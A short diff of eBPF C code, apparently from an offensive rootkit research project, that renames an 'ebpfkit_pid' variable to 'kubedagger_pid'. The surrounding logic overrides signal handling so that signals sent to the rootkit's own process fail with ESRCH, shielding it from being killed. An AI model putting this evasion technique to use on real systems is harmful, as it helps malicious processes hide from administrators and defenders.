@@ -10,10 +10,10 @@
 
 __attribute__((always_inline)) int handle_signal(struct pt_regs *ctx, int pid)
 {
-    u64 ebpfkit_pid;
-    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);
+    u64 kubedagger_pid;
+    LOAD_CONSTANT("kubedagger_pid", kubedagger_pid);
 
-    if (pid == ebpfkit_pid)
+    if (pid == kubedagger_pid)
     {
         bpf_override_return(ctx, -ESRCH);
     }
